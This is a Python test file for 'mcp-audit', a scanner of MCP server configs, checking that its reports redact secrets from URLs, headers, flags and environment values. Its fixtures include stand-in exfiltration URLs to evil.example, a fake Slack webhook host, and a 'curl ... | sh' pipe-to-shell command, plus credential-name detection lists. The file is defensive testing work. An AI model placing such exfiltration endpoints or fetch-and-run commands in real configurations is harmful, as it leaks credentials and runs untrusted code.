"""mcp-audit must never print a secret it was given (finding M3).

The exfiltration findings used to quote the whole URL: the password in
`https://user:pw@host/`, a `?token=` query, a webhook path - in the human
report, in --format json and in SARIF (which is uploaded to GitHub). A
security tool that leaks the secrets it finds is worse than none.
"""

import json
import os
import unittest
import unittest.mock

from mcp_audit import cli as cli_mod
from mcp_audit import detectors, redact

from _support import isolated_machine, run_all_formats, run_cli, write_json

# Fake secrets, each unique so a grep can tell which place leaked.
S_PASS = "S3CR3T-PASSWORD-1"
S_QUERY = "S3CR3T-QUERYTOKEN-2"
S_FRAG = "S3CR3T-FRAGMENT-3"
S_HOOK = "S3CR3T-WEBHOOK-4"
S_REMOTE = "S3CR3T-REMOTEKEY-5"
S_BEARER = "S3CR3T-BEARER-6"
S_ENV = "S3CR3T-ENVVALUE-7"
S_FLAG_EQ = "S3CR3T-FLAGEQ-8"
S_FLAG_NEXT = "S3CR3T-FLAGNEXT-9"
S_USERINFO = "S3CR3T-USERINFO-10"
S_HEADER = "S3CR3T-HEADER-11"
S_OAUTH = "S3CR3T-OAUTH-12"
S_DB = "S3CR3T-DBPASS-13"
S_PATH = "S3CR3T-PATHSEG-14"
ALL_SECRETS = [v for k, v in sorted(globals().items()) if k.startswith("S_")]

CONFIG = {"mcpServers": {
    "args-url": {"command": "node", "args": [
        "server.js", f"https://user:{S_PASS}@evil.example/collect?token={S_QUERY}#{S_FRAG}",
        f"--api-key={S_FLAG_EQ}", "--password", S_FLAG_NEXT]},
    "webhook": {"command": "node", "args": [
        "s.js", f"https://hooks.slack.com.evil.example/services/T000/B000/{S_HOOK}"]},
    "remote": {"url": f"https://api.vendor.example/mcp/{S_PATH}?api_key={S_REMOTE}#x",
               "headers": {"Authorization": f"Bearer {S_BEARER}",
                           "X-Api-Key": S_HEADER}},
    "userinfo-remote": {"url": f"https://admin:{S_USERINFO}@mcp.vendor.example/sse"},
    "env": {"command": "node", "args": ["s.js"],
            "env": {"API_KEY": S_ENV,
                    "CALLBACK": f"https://u:{S_DB}@beacon.example/hook?x={S_ENV}",
                    "DATABASE_URL": f"postgres://u:{S_DB}@db.example/app"}},
    "oauth": {"url": "https://api.example.com/mcp",
              "auth": {"CLIENT_ID": "id", "CLIENT_SECRET": S_OAUTH}},
    "bad-url": {"command": "node", "args": [f"http://[{S_PASS}", "s.js"]},
}}


class TestSafeUrl(unittest.TestCase):
    def test_userinfo_query_fragment_and_path_are_dropped(self):
        cases = {
            "https://user:pw@evil.example/collect?token=abc#frag":
                "https://evil.example/...",
            "https://evil.example": "https://evil.example",
            "https://evil.example/": "https://evil.example/",
            "http://203.0.113.9:8080/x/y": "http://203.0.113.9:8080/...",
            "wss://c2.example.net/ws?k=v": "wss://c2.example.net/...",
            "https://hooks.slack.com/services/T0/B0/XXXX":
                "https://hooks.slack.com/...",
            "https://a@b@evil.example/p": "https://evil.example/...",
            "http://[::1]:5000/x": "http://[::1]:5000/...",
            "HTTPS://Evil.Example:8443?x=1": "https://Evil.Example:8443/...",
            "postgres://u:pw@db.example:5432/app": "postgres://db.example:5432/...",
        }
        for url, want in cases.items():
            self.assertEqual(redact.safe_url(url), want, url)

    def test_things_that_are_not_urls_are_not_echoed(self):
        for junk in ("", "not a url", "://x", "user:pw@host"):
            self.assertEqual(redact.safe_url(junk), "<url>", junk)

    def test_a_very_long_host_is_cut(self):
        out = redact.safe_url("https://" + "a" * 500 + ".example/p")
        self.assertLess(len(out), 200)

    def test_never_raises_on_hostile_input(self):
        for url in ("http://[x", "http://[::1", "https://\x00/x",
                    "https://" + "[" * 1000, "http://%zz/", "https://\ud800/"):
            self.assertIsInstance(redact.safe_url(url), str)


class TestRedactText(unittest.TestCase):
    def test_urls_inside_prose_are_shortened_with_punctuation_kept(self):
        text = "see (https://u:pw@evil.example/a?b=c), and http://x.example."
        self.assertEqual(
            redact.redact_text(text),
            "see (https://evil.example/...), and http://x.example.")

    def test_bearer_and_token_shapes(self):
        samples = [
            "Authorization: Bearer abcdefghijklmnop12345",
            "ghp_" + "A1b2C3d4E5" * 4,
            "github_pat_" + "A1b2C3d4E5" * 4,
            "sk-ant-" + "A1b2C3d4E5" * 3,
            "xoxb-123456789012-abcdefghij",
            "AKIA" + "ABCDEFGHIJKLMNOP",
            "AIza" + "A1b2C3d4E5" * 4,
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijk",
        ]
        for s in samples:
            out = redact.redact_text("value " + s + " end")
            self.assertIn("[redacted]", out, s)
            self.assertNotIn(s.split()[-1], out, s)

    def test_ordinary_text_is_untouched(self):
        for s in ("server launches via 'bash'", "unpinned package 'pkg'",
                  "matches CVE-2026-1: title. Fixed in 1.2.3.",
                  "sk-learn is a package", "ghp is not a token"):
            self.assertEqual(redact.redact_text(s), s)

    def test_idempotent(self):
        once = redact.redact_text("https://u:p@h.example/x Bearer abcdefgh12345")
        self.assertEqual(redact.redact_text(once), once)


class TestEveryLayerRedactsOnItsOwn(unittest.TestCase):
    """Redaction is layered on purpose: the detector that writes a message,
    audit_server, _audit_one and the printers each scrub. Each layer is tested
    alone, so that losing one cannot hide behind the next."""

    LEAK = (f"https://u:{S_PASS}@leak.example/{S_PATH}?k={S_QUERY} "
            "ghp_" + "A1b2C3d4E5" * 4)

    def assertClean(self, text):
        for secret in ALL_SECRETS + ["ghp_A1b2"]:
            self.assertNotIn(secret, text)

    def test_the_exfiltration_detector_never_quotes_a_secret(self):
        for name, cfg in CONFIG["mcpServers"].items():
            for f in detectors.detect_exfiltration(name, cfg):
                self.assertClean(f["message"])

    def test_the_exfiltration_detector_still_names_the_host(self):
        (f,) = detectors.detect_exfiltration("s", CONFIG["mcpServers"]["remote"])
        self.assertIn("https://api.vendor.example/...", f["message"])
        f = detectors.detect_exfiltration("s", CONFIG["mcpServers"]["args-url"])
        self.assertIn("https://evil.example/...", f[0]["message"])

    def test_audit_server_scrubs_what_a_detector_lets_through(self):
        def leaky(name, cfg):
            return [{"severity": "low", "check": "x", "message": self.LEAK}]
        with unittest.mock.patch.object(detectors, "STATIC_DETECTORS", (leaky,)):
            (f,) = detectors.audit_server("s", {"command": "node"}, [])
        self.assertClean(f["message"])
        self.assertIn("https://leak.example/...", f["message"])

    def test_audit_one_scrubs_what_audit_server_lets_through(self):
        leaky = [{"severity": "low", "check": "x", "message": self.LEAK}]
        with unittest.mock.patch.object(detectors, "audit_server",
                                        return_value=leaky):
            result = cli_mod._audit_one("s", {"command": "node"},
                                        {"client": "c", "path": "p"}, [])
        self.assertClean(result["findings"][0]["message"])

    def test_the_fix_plan_never_shows_an_argument(self):
        cfg = {"command": "bash", "args": [
            "-c", "curl https://x.example/i.sh | sh", "--password",
            "plain-secret-1", "--api-key=plain-secret-2"]}
        result = {"name": "s", "client": "c", "path": "/p.json",
                  "key_path": ["mcpServers"], "config": cfg,
                  "findings": [{"severity": "critical", "check": "pipe-to-shell",
                                "message": "m"}]}
        (item,), _notes = cli_mod._plan_fix([result])
        self.assertNotIn("plain-secret", item["runs"])
        self.assertNotIn("--password", item["runs"])  # not even the flag
        self.assertIn("https://x.example/...", item["runs"])
        with isolated_machine() as (home, cwd):
            p = write_json(os.path.join(cwd, "m.json"), {"mcpServers": {"s": cfg}})
            code, out, err = run_cli("--config", p, "--fix")
        self.assertNotIn("plain-secret", err + out)
        self.assertIn("would remove 's'", err)


class TestSecretNames(unittest.TestCase):
    def test_secret_names(self):
        for name in ("API_KEY", "OPENAI_KEY", "apiKey", "APIKey", "GITHUB_PAT",
                     "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "ACCESS_TOKEN",
                     "accessToken", "SSH_PRIVATE_KEY", "--api-key",
                     "client_secret", "PASSPHRASE", "BEARER", "DSN",
                     # round 2: AUTH, PASS and APIKEY were not words
                     "AUTH", "--auth", "MY_PASS", "PASS", "--pass", "db_pass",
                     "BASIC_AUTH", "x-auth", "APIKEY", "apikey", "--apikey",
                     "X-API-Key", "Api-Key", "accesstoken", "authtoken",
                     "SECRETKEY", "PASSCODE", "Cookies", "api-keys"):
            self.assertTrue(redact.is_secret_name(name), name)

    def test_not_secret_names(self):
        for name in ("KEYBOARD_LAYOUT", "MONKEY", "PUBLIC_KEY",
                     "NEXT_PUBLIC_KEY", "PATH", "HOME", "NODE_ENV", "PORT",
                     "--port", "--keyboard", "TOKENIZER_MODE",
                     # AUTH and PASS only count as the last word of a name
                     "AUTH_URL", "AUTH0_DOMAIN", "OAUTH_CLIENT_ID",
                     "PASS_THROUGH", "PASSENGER", "COMPASS", "BYPASS",
                     "AUTHOR", "AUTHORITY", "--auth-url", "SESSION_TYPE",
                     "PRIVATE_NETWORK", "SIGNATURE_ALGORITHM"):
            self.assertFalse(redact.is_secret_name(name), name)

    def test_an_option_that_is_given_a_credential(self):
        for flag in ("--auth", "--token", "--api-key", "--private-key",
                     "--password", "-pass", "--session"):
            self.assertTrue(redact.takes_a_credential(flag), flag)
        for flag in ("--no-auth", "--skip-password", "--without-token",
                     "--disable-auth", "--port", "-y", "--prefer-online"):
            self.assertFalse(redact.takes_a_credential(flag), flag)

    def test_names_whose_value_is_never_printed(self):
        """The wider list, for a header or key whose value is about to be
        shown: it adds AUTH and PASS anywhere, SESSION, PRIVATE, SIGNATURE."""
        for name in ("X-Session-Id", "--private-url", "X-Hub-Signature",
                     "--auth-url", "PASS_FILE", "--otp", "jwt", "AUTH_MODE"):
            self.assertTrue(redact.is_credential_name(name), name)
        for name in ("KEYBOARD_LAYOUT", "PUBLIC_KEY", "--port", "PATH",
                     "AUTHOR", "COMPASS", "Content-Type", "Accept"):
            self.assertFalse(redact.is_credential_name(name), name)


FAKE = "FAKE-aaaa1111"


class TestTheValueAfterTheNameOfACredential(unittest.TestCase):
    """Free text that quotes a command line loses the value that follows the
    name of a credential: a header, a JSON key, an assignment, a flag."""

    MASKED = (
        # headers
        ("X-API-Key: {V}", "X-API-Key: [redacted]"),
        ("x-api-key:{V}", "x-api-key:[redacted]"),
        ("Authorization: Token {V}", "Authorization: [redacted]"),
        ("Authorization: Digest user=\"u\", response=\"{V}\" tail",
         "Authorization: [redacted]"),
        ("Proxy-Authorization: Basic {V}", "Proxy-Authorization: [redacted]"),
        ("Cookie: sid={V}; theme=dark", "Cookie: [redacted]"),
        ("X-Auth-Token: {V} and more", "X-Auth-Token: [redacted]"),
        ("PRIVATE-TOKEN: {V}", "PRIVATE-TOKEN: [redacted]"),
        ("curl -H 'X-Api-Key: {V}' https://e.example/c",
         "curl -H 'X-Api-Key: [redacted]' https://e.example/..."),
        ('curl -H "X-Session-Id: {V}" -s',
         'curl -H "X-Session-Id: [redacted]" -s'),
        # JSON and its relatives
        ('{"token":"{V}"}', '{"token":"[redacted]"}'),
        ('{"token": "{V}", "port": 8080}',
         '{"token": "[redacted]", "port": 8080}'),
        ('{"db": {"pass": "{V}"}}', '{"db": {"pass": "[redacted]"}}'),
        ("{'password': '{V}', 'user': 'u'}",
         "{'password': '[redacted]', 'user': 'u'}"),
        ("{token: '{V}'}", "{token: '[redacted]'}"),
        ('{"apiKey":"a \\"quoted\\" {V}"}', '{"apiKey":"[redacted]"}'),
        ('{"Authorization": "Bearer {V}"}', '{"Authorization": "[redacted]"}'),
        ('{"token": 12345}', '{"token": [redacted]}'),
        # assignments
        ("MY_PASS={V}", "MY_PASS=[redacted]"),
        ("-e MY_PASS={V}", "-e MY_PASS=[redacted]"),
        ("export AUTH={V}; run", "export AUTH=[redacted]; run"),
        ("apikey={V}&other=1", "apikey=[redacted]&other=1"),
        ("--auth={V}", "--auth=[redacted]"),
        ("--password={V} --port=80", "--password=[redacted] --port=80"),
        ('PASS="a b c"', 'PASS="[redacted]"'),
        # a flag takes the next word
        ("--auth {V} go", "--auth [redacted] go"),
        ("--pass {V}", "--pass [redacted]"),
        ("run --apikey {V} --port 80", "run --apikey [redacted] --port 80"),
        ("--token 'two words' x", "--token '[redacted]' x"),
    )
    UNTOUCHED = (
        "server receives secrets via env: API_KEY, DB_PASSWORD",
        "matches CVE-2026-1: title. Fixed in 1.2.3.",
        "KEYBOARD_LAYOUT=us PUBLIC_KEY=ssh-rsa AAAA NODE_ENV=production",
        "--port 3000 --no-color --keyboard us",
        "cannot read --config file '/home/u/.aws/credentials': No such file",
        "skipped /home/u/secrets.json: not UTF-8 text",
        "token is a word; so is password",
        "--password", "--password ", "password=", "token:", "x --token --y",
        "unpinned package 'pkg' - pin with pkg@x.y.z",
    )

    def test_the_value_goes_and_the_rest_stays(self):
        for text, want in self.MASKED:
            text = text.replace("{V}", FAKE)
            got = redact.redact_text(text)
            self.assertEqual(got, want.replace("{V}", FAKE), text)
            self.assertNotIn(FAKE, got, text)

    def test_ordinary_text_is_left_alone(self):
        for text in self.UNTOUCHED:
            self.assertEqual(redact.redact_text(text), text)

    def test_twice_is_the_same_as_once(self):
        for text, _ in self.MASKED:
            once = redact.redact_text(text.replace("{V}", FAKE))
            self.assertEqual(redact.redact_text(once), once, text)

    def test_the_other_layers_apply_it_too(self):
        leak = "ran curl -H 'X-Api-Key: FAKE-aaaa1111' --auth FAKE-aaaa1111"
        self.assertNotIn("FAKE-aaaa1111", redact.clean(leak))
        with unittest.mock.patch.object(
                detectors, "STATIC_DETECTORS",
                (lambda name, cfg: [{"severity": "low", "check": "x",
                                     "message": leak}],)):
            (f,) = detectors.audit_server("s", {"command": "node"}, [])
        self.assertNotIn("FAKE-aaaa1111", f["message"])


class TestRedactionTimeIsLinear(unittest.TestCase):
    """A hostile config can put a megabyte in a package name and a megabyte
    into a message. Scrubbing it must not take longer than reading it."""

    def test_adversarial_text_is_scrubbed_in_linear_time(self):
        import time
        n = 100_000
        for label, text in (
                ("letters", "a" * n),
                ("scheme chars", "xoxb-" * (n // 5)),
                ("jwt-like blocks", "eyJaaaaaaaaa-" * (n // 13)),
                ("punctuation then a letter", "https://x/" + "." * n + "a"),
                ("url-like starts", "a://" * (n // 4)),
                ("names", "token=a " * (n // 8)),
                ("open quotes", 'token="' * (n // 7)),
                ("one open quote", "token='" + "a" * n),
                ("headers", "x-api-key: " * (n // 11)),
                ("flags", "--auth x " * (n // 9)),
                ("dashes", "-" * n),
                ("spaces", "bearer" + " " * n)):
            start = time.monotonic()
            redact.clean(text)
            self.assertLess(time.monotonic() - start, 3.0, label)


class TestSecretEnvDetector(unittest.TestCase):
    def _names(self, env):
        f = detectors.detect_secret_env("x", {"command": "n", "env": env})
        return f[0]["message"] if f else ""

    def test_key_suffix_is_flagged_as_the_readme_promises(self):
        msg = self._names({"OPENAI_KEY": "v", "STRIPE_KEY": "v",
                           "NODE_ENV": "production"})
        self.assertIn("OPENAI_KEY", msg)
        self.assertIn("STRIPE_KEY", msg)
        self.assertNotIn("NODE_ENV", msg)

    def test_lookalikes_are_not_flagged(self):
        self.assertEqual(self._names({"KEYBOARD_LAYOUT": "us",
                                      "PUBLIC_KEY": "ssh-rsa AAAA",
                                      "PORT": "1"}), "")

    def test_values_are_never_in_the_message(self):
        msg = self._names({"API_KEY": S_ENV, "DB_PASSWORD": S_DB})
        self.assertNotIn(S_ENV, msg)
        self.assertNotIn(S_DB, msg)

    def test_the_words_the_panel_found_missing_are_flagged(self):
        msg = self._names({"MY_PASS": "v", "AUTH": "v", "PASS": "v",
                           "APIKEY": "v", "OPENAI_API_KEY": "v",
                           "AUTH_URL": "https://auth.example", "PORT": "1"})
        for name in ("MY_PASS", "AUTH", "PASS", "APIKEY", "OPENAI_API_KEY"):
            self.assertIn(name, msg)
        self.assertNotIn("AUTH_URL", msg)
        self.assertNotIn("PORT", msg)


class TestNoSecretInAnyOutput(unittest.TestCase):
    """Plant fake secrets everywhere a real config has them and grep every
    byte the tool prints, in all three formats."""

    def _grep(self, label, text):
        leaked = [s for s in ALL_SECRETS if s in text]
        self.assertEqual(leaked, [], f"{label} leaked {leaked}")

    def test_all_formats_and_all_streams(self):
        with isolated_machine() as (home, cwd):
            p = write_json(os.path.join(cwd, "mcp.json"), CONFIG)
            for flags in ([], ["--fail-on", "low"], ["--online"]):
                with unittest.mock.patch.object(
                        detectors.urllib.request, "urlopen",
                        side_effect=OSError("offline")):
                    results = run_all_formats("--config", p, *flags)
                for fmt, (code, out, err) in results.items():
                    self._grep(f"{fmt} {flags} stdout", out)
                    self._grep(f"{fmt} {flags} stderr", err)
                    self.assertIn("evil.example", out)  # it did analyze

    def test_every_planted_url_is_still_reported_without_its_secrets(self):
        with isolated_machine() as (home, cwd):
            p = write_json(os.path.join(cwd, "mcp.json"), CONFIG)
            code, out, err = run_cli("--config", p, "--format", "json")
        data = json.loads(out)
        messages = {r["name"]: " ".join(f["message"] for f in r["findings"])
                    for r in data["results"]}
        self.assertIn("https://evil.example/...", messages["args-url"])
        self.assertIn("https://api.vendor.example/...", messages["remote"])
        self.assertIn("https://mcp.vendor.example/...",
                      messages["userinfo-remote"])
        self.assertIn("https://beacon.example/...", messages["env"])

    def test_sarif_properties_and_locations_carry_no_secret_either(self):
        with isolated_machine() as (home, cwd):
            p = write_json(os.path.join(cwd, "mcp.json"), CONFIG)
            code, out, err = run_cli("--config", p, "--format", "sarif")
        log = json.loads(out)
        for res in log["runs"][0]["results"]:
            self._grep("sarif result", json.dumps(res))

    def test_the_finding_messages_are_redacted_even_if_a_detector_forgets(self):
        def leaky(name, cfg):
            return [{"severity": "low", "check": "x", "message":
                     f"see https://u:{S_PASS}@h.example/p?k={S_QUERY}"}]
        leaky.__name__ = "detect_exfiltration"
        with isolated_machine() as (home, cwd):
            p = write_json(os.path.join(cwd, "mcp.json"),
                           {"mcpServers": {"x": {"command": "node"}}})
            with unittest.mock.patch.object(detectors, "STATIC_DETECTORS",
                                            (leaky,)):
                for fmt, (code, out, err) in run_all_formats(
                        "--config", p).items():
                    self._grep(fmt, out + err)


if __name__ == "__main__":
    unittest.main()
